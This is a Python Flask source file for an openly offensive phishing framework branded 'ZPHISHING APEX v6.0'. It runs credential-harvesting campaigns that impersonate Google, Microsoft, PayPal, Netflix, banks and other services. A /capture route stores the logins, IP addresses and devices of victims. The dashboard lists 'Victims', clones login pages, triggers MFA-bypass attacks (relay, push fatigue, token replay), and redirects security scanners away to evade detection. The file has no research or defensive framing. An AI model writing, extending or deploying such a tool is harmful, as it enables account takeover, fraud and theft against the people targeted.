#!/usr/bin/env python3
"""
ZPHISHING APEX v6.0 — "SATAN'S LAB"
The Ultimate Phishing Framework
Built by worm shadow for He

EVERYTHING INCLUDED. NO UPGRADES NEEDED.
"""

import os
import sys
import json
import time
import hashlib
import threading
from datetime import datetime

# Add core to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'core'))

from engine import ZPhishingEngine

# Initialize engine
engine = ZPhishingEngine()

# Try Flask
try:
    from flask import Flask, request, render_template_string, redirect, jsonify, session, send_file
    from functools import wraps
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

if FLASK_AVAILABLE:
    app = Flask(__name__)
    app.secret_key = os.environ.get('SECRET_KEY', os.urandom(32).hex())

    def login_required(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if 'user' not in session:
                return jsonify({'error': 'Login required'}), 401
            return f(*args, **kwargs)
        return decorated

    def admin_required(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if 'user' not in session:
                return jsonify({'error': 'Login required'}), 401
            if session.get('role') != 'admin':
                return jsonify({'error': 'Admin required'}), 403
            return f(*args, **kwargs)
        return decorated

    # ==================== DASHBOARD ====================

    @app.route('/')
    def index():
        return redirect('/dashboard')

    @app.route('/dashboard')
    def dashboard():
        return render_template_string(DASHBOARD_HTML)

    # ==================== API ====================

    @app.route('/api/status')
    def api_status():
        return jsonify({
            'status': 'online',
            'version': '6.0.0',
            'codename': 'SATAN\'S LAB',
            'engine': 'LEVIATHAN',
            'timestamp': datetime.now().isoformat()
        })

    @app.route('/api/stats')
    def api_stats():
        return jsonify(engine.get_stats())

    @app.route('/api/campaigns', methods=['GET', 'POST'])
    def api_campaigns():
        if request.method == 'POST':
            data = request.get_json()
            campaign_id = engine.create_campaign(
                data.get('name', 'Untitled'),
                data.get('template', 'google'),
                **data.get('config', {})
            )
            return jsonify({'id': campaign_id}), 201
        return jsonify(engine.list_campaigns())

    @app.route('/api/campaigns/<campaign_id>', methods=['GET', 'DELETE'])
    def api_campaign(campaign_id):
        if request.method == 'DELETE':
            if campaign_id in engine.campaigns:
                del engine.campaigns[campaign_id]
                return jsonify({'status': 'deleted'})
            return jsonify({'error': 'Not found'}), 404

        campaign = engine.get_campaign(campaign_id)
        if campaign:
            return jsonify(campaign)
        return jsonify({'error': 'Not found'}), 404

    @app.route('/api/campaigns/<campaign_id>/start', methods=['POST'])
    def api_start_campaign(campaign_id):
        if engine.start_campaign(campaign_id):
            return jsonify({'status': 'started'})
        return jsonify({'error': 'Not found'}), 404

    @app.route('/api/campaigns/<campaign_id>/stop', methods=['POST'])
    def api_stop_campaign(campaign_id):
        if engine.stop_campaign(campaign_id):
            return jsonify({'status': 'stopped'})
        return jsonify({'error': 'Not found'}), 404

    @app.route('/api/victims')
    def api_victims():
        campaign_id = request.args.get('campaign_id')
        return jsonify(engine.list_victims(campaign_id))

    @app.route('/api/victims/<victim_id>')
    def api_victim(victim_id):
        victim = engine.get_victim(victim_id)
        if victim:
            return jsonify(victim)
        return jsonify({'error': 'Not found'}), 404

    @app.route('/api/templates')
    def api_templates():
        return jsonify(engine.templates.list_templates())

    @app.route('/api/users', methods=['POST'])
    def api_create_user():
        data = request.get_json()
        result = engine.create_user(
            data.get('username'),
            data.get('password'),
            data.get('role', 'operator')
        )
        return jsonify(result), 201

    @app.route('/api/login', methods=['POST'])
    def api_login():
        data = request.get_json()
        user = engine.authenticate(data.get('username'), data.get('password'))
        if user:
            session['user'] = user['username']
            session['role'] = user['role']
            return jsonify({
                'success': True,
                'user': user['username'],
                'role': user['role'],
                'api_key': user['api_key']
            })
        return jsonify({'error': 'Invalid credentials'}), 401

    @app.route('/api/logout')
    def api_logout():
        session.clear()
        return jsonify({'success': True})

    @app.route('/api/ai/clone', methods=['POST'])
    def api_clone_website():
        data = request.get_json()
        return jsonify(engine.clone_website(data.get('url')))

    @app.route('/api/ai/generate', methods=['POST'])
    def api_generate_template():
        data = request.get_json()
        return jsonify(engine.generate_template(
            data.get('description', ''),
            data.get('platform', 'custom')
        ))

    @app.route('/api/mfa/execute', methods=['POST'])
    def api_mfa_execute():
        data = request.get_json()
        return jsonify(engine.mfa_bypass(
            data.get('method', 'relay'),
            data.get('target', ''),
            **data.get('params', {})
        ))

    @app.route('/api/blockchain/status')
    def api_blockchain_status():
        return jsonify(engine.blockchain.get_network_status())

    @app.route('/api/blockchain/verify', methods=['POST'])
    def api_blockchain_verify():
        data = request.get_json()
        return jsonify(engine.blockchain.verify(data))

    @app.route('/api/evasion/check', methods=['POST'])
    def api_evasion_check():
        data = request.get_json()
        return jsonify({'should_evade': engine.check_evasion(data)})

    @app.route('/api/logs')
    def api_logs():
        return jsonify(engine.logs[-100:])  # Last 100 logs

    # ==================== CAPTURE ====================

    @app.route('/campaign/<campaign_id>')
    def campaign_page(campaign_id):
        html = engine.get_campaign_html(campaign_id)
        if html:
            return render_template_string(html)
        return "Campaign not found", 404

    @app.route('/capture', methods=['POST'])
    def capture():
        campaign_id = request.args.get('c', '')
        data = request.form.to_dict()

        request_info = {
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'unknown')
        }

        # Check evasion
        if engine.check_evasion(request_info):
            campaign = engine.get_campaign(campaign_id)
            return redirect(campaign.get('redirect_url', 'https://www.google.com') if campaign else 'https://www.google.com')

        victim_id = engine.capture(campaign_id, data, request_info)
        campaign = engine.get_campaign(campaign_id)
        return redirect(campaign.get('redirect_url', 'https://www.google.com') if campaign else 'https://www.google.com')

    # ==================== DASHBOARD HTML ====================

    DASHBOARD_HTML = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ZPHISHING APEX v6.0 — SATAN'S LAB</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
            body { font-family: 'JetBrains Mono', monospace; background: #0a0a0f; }
            .glass { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
            .glow { box-shadow: 0 0 30px rgba(255,0,64,0.5); }
            .neon { text-shadow: 0 0 20px currentColor; }
            .tab { cursor: pointer; padding: 10px 20px; border-radius: 8px; transition: all 0.3s; }
            .tab:hover, .tab.active { background: rgba(255,0,64,0.2); color: #ff0040; }
            .section { display: none; }
            .section.active { display: block; }
            input, select, textarea { background: #1a1a2e; border: 1px solid #333; color: #fff; padding: 10px; border-radius: 6px; width: 100%; }
            button { background: #ff0040; color: #fff; padding: 10px 20px; border-radius: 6px; border: none; cursor: pointer; transition: all 0.3s; }
            button:hover { background: #cc0033; transform: translateY(-2px); }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
            th { color: #888; font-size: 12px; text-transform: uppercase; }
        </style>
    </head>
    <body class="text-white min-h-screen">
        <!-- Header -->
        <div class="p-6 border-b border-gray-800">
            <div class="flex justify-between items-center">
                <div>
                    <h1 class="text-4xl font-bold neon text-red-500">ZPHISHING APEX</h1>
                    <p class="text-gray-400 mt-1">v6.0 — SATAN'S LAB | Built by worm shadow for He</p>
                </div>
                <div class="flex gap-4">
                    <div class="text-center">
                        <p class="text-3xl font-bold text-red-500" id="stat-campaigns">0</p>
                        <p class="text-xs text-gray-500">Campaigns</p>
                    </div>
                    <div class="text-center">
                        <p class="text-3xl font-bold text-yellow-500" id="stat-victims">0</p>
                        <p class="text-xs text-gray-500">Victims</p>
                    </div>
                    <div class="text-center">
                        <p class="text-3xl font-bold text-green-500" id="stat-blockchain">0</p>
                        <p class="text-xs text-gray-500">Blocks</p>
                    </div>
                    <div class="text-center">
                        <p class="text-3xl font-bold text-blue-500" id="stat-templates">0</p>
                        <p class="text-xs text-gray-500">Templates</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Tabs -->
        <div class="flex gap-2 p-4 border-b border-gray-800">
            <div class="tab active" onclick="showSection('dashboard')">Dashboard</div>
            <div class="tab" onclick="showSection('campaigns')">Campaigns</div>
            <div class="tab" onclick="showSection('victims')">Victims</div>
            <div class="tab" onclick="showSection('templates')">Templates</div>
            <div class="tab" onclick="showSection('ai')">AI Lab</div>
            <div class="tab" onclick="showSection('mfa')">MFA Bypass</div>
            <div class="tab" onclick="showSection('blockchain')">Blockchain</div>
            <div class="tab" onclick="showSection('evasion')">Evasion</div>
            <div class="tab" onclick="showSection('logs')">Logs</div>
        </div>

        <!-- Dashboard Section -->
        <div id="dashboard" class="section active p-6">
            <div class="grid grid-cols-4 gap-4 mb-6">
                <div class="glass p-6 rounded-xl glow">
                    <h3 class="text-gray-400 text-sm">Total Campaigns</h3>
                    <p class="text-4xl font-bold text-red-500" id="dash-campaigns">0</p>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h3 class="text-gray-400 text-sm">Total Victims</h3>
                    <p class="text-4xl font-bold text-yellow-500" id="dash-victims">0</p>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h3 class="text-gray-400 text-sm">Active Users</h3>
                    <p class="text-4xl font-bold text-green-500" id="dash-users">0</p>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h3 class="text-gray-400 text-sm">Blockchain Valid</h3>
                    <p class="text-4xl font-bold text-blue-500" id="dash-chain">✓</p>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-6">
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-xl font-bold mb-4">Campaign Performance</h2>
                    <canvas id="chart-campaigns" height="200"></canvas>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-xl font-bold mb-4">Recent Activity</h2>
                    <div id="recent-activity" class="space-y-2"></div>
                </div>
            </div>
        </div>

        <!-- Campaigns Section -->
        <div id="campaigns" class="section p-6">
            <div class="glass p-6 rounded-xl mb-6">
                <h2 class="text-xl font-bold mb-4">Create Campaign</h2>
                <div class="grid grid-cols-3 gap-4">
                    <input type="text" id="camp-name" placeholder="Campaign name">
                    <select id="camp-template">
                        <option value="google">Google</option>
                        <option value="microsoft">Microsoft</option>
                        <option value="facebook">Facebook</option>
                        <option value="instagram">Instagram</option>
                        <option value="twitter">Twitter</option>
                        <option value="linkedin">LinkedIn</option>
                        <option value="paypal">PayPal</option>
                        <option value="netflix">Netflix</option>
                        <option value="amazon">Amazon</option>
                        <option value="steam">Steam</option>
                    </select>
                    <button onclick="createCampaign()">Create Campaign</button>
                </div>
            </div>

            <div class="glass p-6 rounded-xl">
                <h2 class="text-xl font-bold mb-4">All Campaigns</h2>
                <table>
                    <thead>
                        <tr><th>ID</th><th>Name</th><th>Template</th><th>Status</th><th>Victims</th><th>Actions</th></tr>
                    </thead>
                    <tbody id="campaigns-list"></tbody>
                </table>
            </div>
        </div>

        <!-- Victims Section -->
        <div id="victims" class="section p-6">
            <div class="glass p-6 rounded-xl">
                <h2 class="text-xl font-bold mb-4">Captured Victims</h2>
                <table>
                    <thead>
                        <tr><th>ID</th><th>Campaign</th><th>IP</th><th>Device</th><th>Time</th><th>Actions</th></tr>
                    </thead>
                    <tbody id="victims-list"></tbody>
                </table>
            </div>
        </div>

        <!-- Templates Section -->
        <div id="templates" class="section p-6">
            <div class="glass p-6 rounded-xl">
                <h2 class="text-xl font-bold mb-4">Available Templates</h2>
                <div class="grid grid-cols-5 gap-4" id="templates-grid"></div>
            </div>
        </div>

        <!-- AI Lab Section -->
        <div id="ai" class="section p-6">
            <div class="grid grid-cols-2 gap-6">
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-xl font-bold mb-4">Clone Website</h2>
                    <input type="text" id="clone-url" placeholder="https://example.com/login" class="mb-4">
                    <button onclick="cloneWebsite()">Clone</button>
                    <div id="clone-result" class="mt-4 p-4 bg-gray-800 rounded hidden"></div>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-xl font-bold mb-4">Generate Template</h2>
                    <input type="text" id="gen-desc" placeholder="Bank login with card verification" class="mb-4">
                    <select id="gen-platform" class="mb-4">
                        <option value="bank">Banking</option>
                        <option value="corporate">Corporate</option>
                        <option value="social">Social</option>
                        <option value="gaming">Gaming</option>
                    </select>
                    <button onclick="generateTemplate()">Generate</button>
                    <div id="gen-result" class="mt-4 p-4 bg-gray-800 rounded hidden"></div>
                </div>
            </div>
        </div>

        <!-- MFA Bypass Section -->
        <div id="mfa" class="section p-6">
            <div class="glass p-6 rounded-xl">
                <h2 class="text-xl font-bold mb-4">MFA Bypass Lab</h2>
                <div class="grid grid-cols-3 gap-4 mb-4">
                    <select id="mfa-method">
                        <option value="relay">Relay Attack</option>
                        <option value="push_fatigue">Push Fatigue</option>
                        <option value="token_replay">Token Replay</option>
                    </select>
                    <input type="text" id="mfa-target" placeholder="Target email/phone">
                    <button onclick="executeMFA()">Execute</button>
                </div>
                <div id="mfa-result" class="p-4 bg-gray-800 rounded hidden"></div>
            </div>
        </div>

        <!-- Blockchain Section -->
        <div id="blockchain" class="section p-6">
            <div class="grid grid-cols-2 gap-6">
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-xl font-bold mb-4">Network Status</h2>
                    <div id="blockchain-status"></div>
                </div>
                <div class="glass p-6 rounded-xl">
                    <h2 class="text-xl font-bold mb-4">Verify Data</h2>
                    <textarea id="blockchain-data" placeholder='{"email": "test@example.com"}' rows="4" class="mb-4"></textarea>
                    <button onclick="verifyBlockchain()">Verify on Blockchain</button>
                    <div id="blockchain-result" class="mt-4 p-4 bg-gray-800 rounded hidden"></div>
                </div>
            </div>
        </div>

        <!-- Evasion Section -->
        <div id="evasion" class="section p-6">
            <div class="glass p-6 rounded-xl">
                <h2 class="text-xl font-bold mb-4">Evasion Test</h2>
                <input type="text" id="evasion-ua" placeholder="User agent to test" class="mb-4">
                <button onclick="testEvasion()">Test</button>
                <div id="evasion-result" class="mt-4 p-4 bg-gray-800 rounded hidden"></div>
            </div>
        </div>

        <!-- Logs Section -->
        <div id="logs" class="section p-6">
            <div class="glass p-6 rounded-xl">
                <h2 class="text-xl font-bold mb-4">System Logs</h2>
                <div id="logs-list" class="space-y-1 font-mono text-sm"></div>
            </div>
        </div>

        <script>
            // Initialize
            loadStats();
            loadCampaigns();
            loadVictims();
            loadTemplates();

            setInterval(loadStats, 5000);

            function showSection(name) {
                document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.getElementById(name).classList.add('active');
                event.target.classList.add('active');
            }

            async function loadStats() {
                const res = await fetch('/api/stats');
                const data = await res.json();

                document.getElementById('stat-campaigns').textContent = data.campaigns;
                document.getElementById('stat-victims').textContent = data.victims;
                document.getElementById('stat-blockchain').textContent = data.blockchain_length;
                document.getElementById('stat-templates').textContent = data.templates;

                document.getElementById('dash-campaigns').textContent = data.campaigns;
                document.getElementById('dash-victims').textContent = data.victims;
                document.getElementById('dash-users').textContent = data.users;
                document.getElementById('dash-chain').textContent = data.blockchain_valid ? '✓' : '✗';
            }

            async function loadCampaigns() {
                const res = await fetch('/api/campaigns');
                const data = await res.json();
                const tbody = document.getElementById('campaigns-list');
                tbody.innerHTML = data.map(c => `
                    <tr>
                        <td class="text-red-500">${c.id}</td>
                        <td>${c.name}</td>
                        <td>${c.template}</td>
                        <td><span class="px-2 py-1 rounded text-xs ${c.status === 'active' ? 'bg-green-500/20 text-green-500' : 'bg-gray-500/20 text-gray-500'}">${c.status}</span></td>
                        <td>${c.victims}</td>
                        <td>
                            <button onclick="startCampaign('${c.id}')" class="px-2 py-1 bg-green-500 rounded text-xs">Start</button>
                            <button onclick="stopCampaign('${c.id}')" class="px-2 py-1 bg-yellow-500 rounded text-xs">Stop</button>
                            <button onclick="deleteCampaign('${c.id}')" class="px-2 py-1 bg-red-500 rounded text-xs">Delete</button>
                        </td>
                    </tr>
                `).join('');
            }

            async function loadVictims() {
                const res = await fetch('/api/victims');
                const data = await res.json();
                const tbody = document.getElementById('victims-list');
                tbody.innerHTML = data.map(v => `
                    <tr>
                        <td class="text-red-500">${v.id}</td>
                        <td>${v.campaign_id}</td>
                        <td>${v.ip}</td>
                        <td>${v.device?.device || 'Unknown'}</td>
                        <td>${v.timestamp}</td>
                        <td><button onclick="viewVictim('${v.id}')" class="px-2 py-1 bg-blue-500 rounded text-xs">View</button></td>
                    </tr>
                `).join('');
            }

            async function loadTemplates() {
                const res = await fetch('/api/templates');
                const data = await res.json();
                const grid = document.getElementById('templates-grid');
                grid.innerHTML = data.map(t => `
                    <div class="glass p-4 rounded-lg text-center">
                        <p class="font-bold">${t.name}</p>
                        <p class="text-xs text-gray-500">${t.category}</p>
                    </div>
                `).join('');
            }

            async function createCampaign() {
                const name = document.getElementById('camp-name').value;
                const template = document.getElementById('camp-template').value;

                await fetch('/api/campaigns', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({name, template})
                });

                loadStats();
                loadCampaigns();
            }

            async function startCampaign(id) {
                await fetch(`/api/campaigns/${id}/start`, {method: 'POST'});
                loadCampaigns();
            }

            async function stopCampaign(id) {
                await fetch(`/api/campaigns/${id}/stop`, {method: 'POST'});
                loadCampaigns();
            }

            async function deleteCampaign(id) {
                if (confirm('Delete this campaign?')) {
                    await fetch(`/api/campaigns/${id}`, {method: 'DELETE'});
                    loadStats();
                    loadCampaigns();
                }
            }

            async function cloneWebsite() {
                const url = document.getElementById('clone-url').value;
                const res = await fetch('/api/ai/clone', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url})
                });
                const data = await res.json();
                document.getElementById('clone-result').classList.remove('hidden');
                document.getElementById('clone-result').innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
            }

            async function generateTemplate() {
                const desc = document.getElementById('gen-desc').value;
                const platform = document.getElementById('gen-platform').value;
                const res = await fetch('/api/ai/generate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({description: desc, platform})
                });
                const data = await res.json();
                document.getElementById('gen-result').classList.remove('hidden');
                document.getElementById('gen-result').innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
            }

            async function executeMFA() {
                const method = document.getElementById('mfa-method').value;
                const target = document.getElementById('mfa-target').value;
                const res = await fetch('/api/mfa/execute', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({method, target})
                });
                const data = await res.json();
                document.getElementById('mfa-result').classList.remove('hidden');
                document.getElementById('mfa-result').innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
            }

            async function verifyBlockchain() {
                const data = JSON.parse(document.getElementById('blockchain-data').value);
                const res = await fetch('/api/blockchain/verify', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                const result = await res.json();
                document.getElementById('blockchain-result').classList.remove('hidden');
                document.getElementById('blockchain-result').innerHTML = `<pre>${JSON.stringify(result, null, 2)}</pre>`;
            }

            async function testEvasion() {
                const ua = document.getElementById('evasion-ua').value;
                const res = await fetch('/api/evasion/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({user_agent: ua, ip: '192.168.1.1'})
                });
                const data = await res.json();
                document.getElementById('evasion-result').classList.remove('hidden');
                document.getElementById('evasion-result').innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
            }

            // Load blockchain status
            fetch('/api/blockchain/status').then(r => r.json()).then(data => {
                document.getElementById('blockchain-status').innerHTML = `
                    <p>Network: ${data.network}</p>
                    <p>Chain ID: ${data.chain_id}</p>
                    <p>Blocks: ${data.blocks}</p>
                    <p>Valid: ${data.valid ? '✓' : '✗'}</p>
                `;
            });

            // Load logs
            fetch('/api/logs').then(r => r.json()).then(data => {
                document.getElementById('logs-list').innerHTML = data.map(l => 
                    `<p><span class="text-gray-500">[${l.timestamp}]</span> ${l.message}</p>`
                ).join('');
            });
        </script>
    </body>
    </html>
    """

    def run(host='127.0.0.1', port=8080, debug=False):
        print("=" * 70)
        print("  ZPHISHING APEX v6.0 — SATAN'S LAB")
        print("  Built by worm shadow for He")
        print("=" * 70)
        print(f"  Dashboard: http://{host}:{port}/dashboard")
        print(f"  API: http://{host}:{port}/api")
        print("=" * 70)
        app.run(host=host, port=port, debug=debug)

    if __name__ == '__main__':
        run()

else:
    print("ZPHISHING APEX v6.0 — CLI Mode")
    print("Install Flask: pip install flask")

    # Run tests
    print("\n" + "=" * 50)
    print("RUNNING VERIFICATION TESTS")
    print("=" * 50)

    # Test crypto
    print("\n[1] Crypto Test...")
    encrypted = engine.crypto.encrypt("test_password")
    decrypted = engine.crypto.decrypt(encrypted)
    print(f"  Encrypt/Decrypt: {'PASS' if decrypted == 'test_password' else 'FAIL'}")

    # Test blockchain
    print("\n[2] Blockchain Test...")
    result = engine.blockchain.verify({'test': 'data'})
    print(f"  Block created: {'PASS' if result['block_index'] > 0 else 'FAIL'}")
    print(f"  Chain valid: {'PASS' if engine.blockchain.verify_chain() else 'FAIL'}")

    # Test user
    print("\n[3] User Test...")
    auth = engine.authenticate('admin', 'admin123')
    print(f"  Auth: {'PASS' if auth else 'FAIL'}")

    # Test campaign
    print("\n[4] Campaign Test...")
    camp_id = engine.create_campaign('Test', 'google')
    print(f"  Created: {'PASS' if camp_id else 'FAIL'}")

    # Test capture
    print("\n[5] Capture Test...")
    victim_id = engine.capture(camp_id, {'email': 'test@test.com', 'password': 'pass'}, {'ip': '1.2.3.4', 'user_agent': 'Mozilla/5.0'})
    victim = engine.get_victim(victim_id)
    print(f"  Captured: {'PASS' if victim and victim['data']['email'] == 'test@test.com' else 'FAIL'}")

    # Test AI
    print("\n[6] AI Test...")
    ai_result = engine.generate_template('test', 'bank')
    print(f"  Generated: {'PASS' if ai_result['success'] else 'FAIL'}")

    # Test MFA
    print("\n[7] MFA Test...")
    mfa_result = engine.mfa_bypass('relay', 'test@example.com')
    print(f"  Relay: {'PASS' if mfa_result.get('session_id') else 'FAIL'}")

    # Test templates
    print("\n[8] Templates Test...")
    templates = engine.templates.list_templates()
    print(f"  Loaded: {'PASS' if len(templates) > 0 else 'FAIL'} ({len(templates)} templates)")

    # Final stats
    print("\n" + "=" * 50)
    print("FINAL STATS")
    print("=" * 50)
    stats = engine.get_stats()
    print(f"  Campaigns: {stats['campaigns']}")
    print(f"  Victims: {stats['victims']}")
    print(f"  Users: {stats['users']}")
    print(f"  Blockchain: {stats['blockchain_length']} blocks")
    print(f"  Templates: {stats['templates']}")
    print("\n" + "=" * 50)
    print("ALL SYSTEMS OPERATIONAL")
    print("=" * 50)
